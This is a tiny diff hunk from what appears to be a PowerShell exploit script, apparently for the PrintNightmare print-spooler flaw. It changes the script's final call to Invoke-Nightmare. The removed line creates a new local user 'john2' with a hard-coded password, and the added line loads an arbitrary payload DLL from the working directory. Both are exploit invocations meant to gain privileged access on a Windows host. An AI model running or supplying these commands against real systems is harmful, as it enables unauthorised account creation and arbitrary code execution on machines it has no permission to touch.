@@ -798,4 +798,4 @@ New-Struct. :P
 }
 
 
-Invoke-Nightmare -NewUser "john2" -NewPassword "john2"
+Invoke-Nightmare -DLL "$PWD\payload.dll"
